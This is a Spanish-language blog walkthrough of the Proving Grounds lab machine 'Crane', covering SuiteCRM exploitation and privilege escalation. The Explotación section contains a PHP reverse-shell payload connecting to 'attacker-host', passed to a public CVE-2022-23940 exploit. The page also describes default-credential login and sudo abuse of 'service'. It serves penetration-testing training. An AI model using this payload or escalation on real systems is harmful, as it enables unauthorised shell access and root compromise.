@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Crane - AntuSec</title><meta name="Description" content="Blog de AntuSec, articulos sobre ctfs y ciberseguridad"><meta property="og:url" content="http://localhost:1313/es/crane/">
+  <meta property="og:site_name" content="AntuSec">
+  <meta property="og:title" content="Crane">
+  <meta property="og:description" content="Descripción Dificultad: intermedia (valorada como easy)
+En esta maquina de Proving Grounds Practice, veremos la explotación del software SuiteCRM a través de un exploit publico y una escalada de privilegios aprovechándonos de permisos sobre un binario que es posible ejecutar con sudo.
+Escaneo y Análisis de Vulnerabilidades Iniciamos realizando un escaneo con nmap sobre la maquina crane
+nmap -p- --open -T4 -Pn -n -vvv -sS 192.168.250.146 -oG allPorts">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-05-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-05-02T11:24:09+02:00">
+    <meta property="article:tag" content="Walkthrough">
+    <meta property="article:tag" content="PG">
+    <meta property="article:tag" content="TjNull">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="Intermediate">
+    <meta property="og:image" content="http://localhost:1313/es/crane/preimagen.jpeg">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/es/crane/preimagen.jpeg">
+  <meta name="twitter:title" content="Crane">
+  <meta name="twitter:description" content="Descripción Dificultad: intermedia (valorada como easy)
+En esta maquina de Proving Grounds Practice, veremos la explotación del software SuiteCRM a través de un exploit publico y una escalada de privilegios aprovechándonos de permisos sobre un binario que es posible ejecutar con sudo.
+Escaneo y Análisis de Vulnerabilidades Iniciamos realizando un escaneo con nmap sobre la maquina crane
+nmap -p- --open -T4 -Pn -n -vvv -sS 192.168.250.146 -oG allPorts">
+<meta name="application-name" content="AntuSec">
+<meta name="apple-mobile-web-app-title" content="AntuSec">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/es/crane/" /><link rel="prev" href="http://localhost:1313/es/sauna/" /><link rel="next" href="http://localhost:1313/es/agentec2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Crane",
+        "inLanguage": "es",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/es\/crane\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/es\/crane\/preimagen.jpeg",
+                            "width":  377 ,
+                            "height":  134 
+                        }],"genre": "posts","keywords": "Walkthrough, PG, TjNull, OSCP, Easy, Intermediate","wordcount":  422 ,
+        "url": "http:\/\/localhost:1313\/es\/crane\/","datePublished": "2024-05-01T00:00:00+00:00","dateModified": "2024-05-02T11:24:09+02:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/localhost:1313\/images\/avatar.png",
+                    "width":  398 ,
+                    "height":  292 
+                }},"author": {
+                "@type": "Person",
+                "name": "Antu"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/es/" title="AntuSec">AntuSec</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/es/posts/"> Publicaciones </a><a class="menu-item" href="/es/tags/"> Etiquetas </a><a class="menu-item" href="/es/categories/"> Categorias </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Buscar">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Limpiar">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="Selecciona el lenguage">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/es/crane/" selected>Español</option></select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/es/" title="AntuSec">AntuSec</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Buscar">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Limpiar">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancelar
+                    </a>
+                </div><a class="menu-item" href="/es/posts/" title="">Publicaciones</a><a class="menu-item" href="/es/tags/" title="">Etiquetas</a><a class="menu-item" href="/es/categories/" title="">Categorias</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Selecciona el lenguage">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/es/crane/" selected>Español</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contenido</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Crane</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/es/" title="Author" rel="author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>Antu</a></span>&nbsp;<span class="post-category">incluido en <a href="/es/categories/proving-grounds/"><i class="far fa-folder" aria-hidden="true"></i>Proving Grounds</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2024-05-01">2024-05-01</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;422 palabras&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;2 minutos&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/preimagen.jpeg"
+        data-srcset="/es/crane/preimagen.jpeg, /es/crane/preimagen.jpeg 1.5x, /es/crane/preimagen.jpeg 2x"
+        data-sizes="auto"
+        alt="/es/crane/preimagen.jpeg"
+        title="/es/crane/preimagen.jpeg" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contenido</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#descripción">Descripción</a></li>
+    <li><a href="#escaneo-y-análisis-de-vulnerabilidades">Escaneo y Análisis de Vulnerabilidades</a></li>
+    <li><a href="#explotación">Explotación</a></li>
+    <li><a href="#escalda-de-privilegios">Escalda de privilegios</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="descripción">Descripción</h2>
+<p>Dificultad: intermedia (valorada como easy)</p>
+<p>En esta maquina de Proving Grounds Practice, veremos la explotación del software SuiteCRM a través de un exploit publico y una escalada de privilegios aprovechándonos de permisos sobre un binario que es posible ejecutar con sudo.</p>
+<h2 id="escaneo-y-análisis-de-vulnerabilidades">Escaneo y Análisis de Vulnerabilidades</h2>
+<p>Iniciamos realizando un escaneo con nmap sobre la maquina crane</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --open -T4 -Pn -n -vvv -sS 192.168.250.146  -oG allPorts</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled.png"
+        data-srcset="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled.png, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled.png 1.5x, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled.png 2x"
+        data-sizes="auto"
+        alt="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled.png"
+        title="Untitled" width="704" height="382" /></p>
+<p>Exportamos los resultados en formato grepeable para poder copiar y pegar los puertos obtenidos en un nuevo escaneo a través de la función extracPorts.</p>
+<p>Esta función es un extra que podéis añadir a vuestra zshrc para agilizar vuestros escaneos.</p>
+<p>Una vez en vuestra zshrc debeis cerrar la terminal y abrir una nueva para que se completen los cambios.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Funcion extracPorts</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Extract nmap information</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> extractPorts<span class="o">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">ports</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>cat <span class="nv">$1</span> <span class="p">|</span> grep -oP <span class="s1">&#39;\d{1,5}/open&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $1}&#39;</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">&#39;/&#39;</span> <span class="p">|</span> xargs <span class="p">|</span> tr <span class="s1">&#39; &#39;</span> <span class="s1">&#39;,&#39;</span><span class="k">)</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">ip_address</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>cat <span class="nv">$1</span> <span class="p">|</span> grep -oP <span class="s1">&#39;\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}&#39;</span> <span class="p">|</span> sort -u <span class="p">|</span> head -n 1<span class="k">)</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;\n[*] Extracting information...\n&#34;</span> &gt; extractPorts.tmp
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;\t[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">&#34;</span>  &gt;&gt; extractPorts.tmp
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;\t[*] Open ports: </span><span class="nv">$ports</span><span class="s2">\n&#34;</span>  &gt;&gt; extractPorts.tmp
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="nv">$ports</span> <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span> <span class="p">|</span> xclip -sel clip
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;[*] Ports copied to clipboard\n&#34;</span>  &gt;&gt; extractPorts.tmp
+</span></span><span class="line"><span class="cl">    cat extractPorts.tmp<span class="p">;</span> rm extractPorts.tmp
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%201.png"
+        data-srcset="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%201.png, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%201.png 1.5x, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%201.png 2x"
+        data-sizes="auto"
+        alt="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%201.png"
+        title="Untitled" width="484" height="179" /></p>
+<p>Nos interesa el puerto 80 del cual obtendremos mas información en el siguiente escaneo.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p22,80,3306,33060 -sCV 192.168.250.146 -oN target</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%202.png"
+        data-srcset="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%202.png, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%202.png 1.5x, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%202.png 2x"
+        data-sizes="auto"
+        alt="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%202.png"
+        title="Untitled" width="881" height="591" /></p>
+<p>Vemos que en el puerto 80 hay un servidor apache, por lo que pasamos a ver su contenido.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%203.png"
+        data-srcset="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%203.png, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%203.png 1.5x, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%203.png 2x"
+        data-sizes="auto"
+        alt="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%203.png"
+        title="Untitled" width="1280" height="667" /></p>
+<p>Nos encontramos ante un login, lo primero que se me ocurre es probar credenciales por defecto como admin:admin y…</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%204.png"
+        data-srcset="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%204.png, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%204.png 1.5x, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%204.png 2x"
+        data-sizes="auto"
+        alt="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%204.png"
+        title="Untitled" width="1859" height="953" /></p>
+<p>Exito!</p>
+<h2 id="explotación">Explotación</h2>
+<p>Tras obtener unas credenciales validas he pasado a buscar si existe algún exploit publico para la versión de este software y encontré el siguiente.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%205.png"
+        data-srcset="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%205.png, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%205.png 1.5x, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%205.png 2x"
+        data-sizes="auto"
+        alt="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%205.png"
+        title="Untitled" width="766" height="336" /></p>
+<p>Exploit:</p>
+<p><a href="https://github.com/manuelz120/CVE-2022-23940" target="_blank" rel="noopener noreffer ">https://github.com/manuelz120/CVE-2022-23940</a></p>
+<p>Ejecutando la siguiente linea de comandos obtenemos la reverse shell</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nos ponemos a la escucha</span>
+</span></span><span class="line"><span class="cl">nc -nlvp <span class="m">80</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Ejecutamos exploit</span>
+</span></span><span class="line"><span class="cl">./exploit.py -u admin -p admin --payload <span class="s2">&#34;php -r &#39;\$sock=fsockopen(\&#34;attacker-host\&#34;, 80); exec(\&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;);&#39;&#34;</span></span></span></code></pre></div></div>
+<p>y voila!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%206.png"
+        data-srcset="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%206.png, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%206.png 1.5x, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%206.png 2x"
+        data-sizes="auto"
+        alt="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%206.png"
+        title="Untitled" width="603" height="121" /></p>
+<p>Tras realizar un tratamiento de la tty</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># tratamiento de la tty</span>
+</span></span><span class="line"><span class="cl">script /dev/null -c bash
+</span></span><span class="line"><span class="cl">ctrl + z
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl">reset xterm
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+</span></span><span class="line"><span class="cl">stty rows <span class="m">59</span> columns <span class="m">236</span></span></span></code></pre></div></div>
+<p>La primera flag se encuentra en /var/www</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%207.png"
+        data-srcset="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%207.png, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%207.png 1.5x, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%207.png 2x"
+        data-sizes="auto"
+        alt="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%207.png"
+        title="Untitled" width="349" height="59" /></p>
+<h2 id="escalda-de-privilegios">Escalda de privilegios</h2>
+<p>si comprobamos los permisos sudo del usuario vemos que podemos ejecutar el binario service con sudo.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -l</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%208.png"
+        data-srcset="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%208.png, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%208.png 1.5x, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%208.png 2x"
+        data-sizes="auto"
+        alt="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%208.png"
+        title="Untitled" width="893" height="121" /></p>
+<p>En la siguiente web encontramos como podemos explotar este binario con sudo</p>
+<p><a href="https://gtfobins.github.io/gtfobins/service/#sudo" target="_blank" rel="noopener noreffer ">https://gtfobins.github.io/gtfobins/service/#sudo</a></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%209.png"
+        data-srcset="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%209.png, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%209.png 1.5x, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%209.png 2x"
+        data-sizes="auto"
+        alt="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%209.png"
+        title="Untitled" width="840" height="198" /></p>
+<p>Ejecutamos y…</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%2010.png"
+        data-srcset="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%2010.png, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%2010.png 1.5x, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%2010.png 2x"
+        data-sizes="auto"
+        alt="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%2010.png"
+        title="Untitled" width="421" height="57" /></p>
+<p>La flag se encuentra en /root</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%2011.png"
+        data-srcset="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%2011.png, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%2011.png 1.5x, /es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%2011.png 2x"
+        data-sizes="auto"
+        alt="/es/crane/Crane%2075d81ecb6c5b4b01a5f6f7bce328950a/Untitled%2011.png"
+        title="Untitled" width="274" height="47" /></p>
+<p>Maquina Crane Pwned!</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Actualizado el 2024-05-02</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/es/crane/index.md" target="_blank">Leer Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Compartir en X" data-sharer="x" data-url="http://localhost:1313/es/crane/" data-title="Crane" data-hashtags="Walkthrough,PG,TjNull,OSCP,Easy,Intermediate"><i class="fab fa-x-twitter" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Threads" data-sharer="threads" data-url="http://localhost:1313/es/crane/" data-title="Crane"><i class="fab fa-threads" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Facebook" data-sharer="facebook" data-url="http://localhost:1313/es/crane/" data-hashtag="Walkthrough"><i class="fab fa-facebook-square" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/es/crane/"><i class="fab fa-linkedin" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/es/crane/" data-title="Crane"><i class="fab fa-hacker-news" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Line" data-sharer="line" data-url="http://localhost:1313/es/crane/" data-title="Crane"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en 微博" data-sharer="weibo" data-url="http://localhost:1313/es/crane/" data-title="Crane"><i class="fab fa-weibo" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/es/crane/" data-title="Crane" data-description=""><i class="fab fa-diaspora" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fes%2fcrane%2f&amp;text=Crane" target="_blank" title="Compartir en Telegram"><i class="fab fa-telegram" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/es/tags/walkthrough/">Walkthrough</a>,&nbsp;<a href="/es/tags/pg/">PG</a>,&nbsp;<a href="/es/tags/tjnull/">TjNull</a>,&nbsp;<a href="/es/tags/oscp/">OSCP</a>,&nbsp;<a href="/es/tags/easy/">Easy</a>,&nbsp;<a href="/es/tags/intermediate/">Intermediate</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Regresar</a></span>&nbsp;|&nbsp;<span><a href="/es/">Inicio</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/es/sauna/" class="prev" rel="prev" title="Sauna Walkthrough"><i class="fas fa-angle-left" aria-hidden="true"></i>Sauna Walkthrough</a>
+            <a href="/es/agentec2/" class="next" rel="next" title="Ejecucion Agente AdaptixC2">Ejecucion Agente AdaptixC2<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Con la tecnología de <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.157.0">Hugo</a> | Tema - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
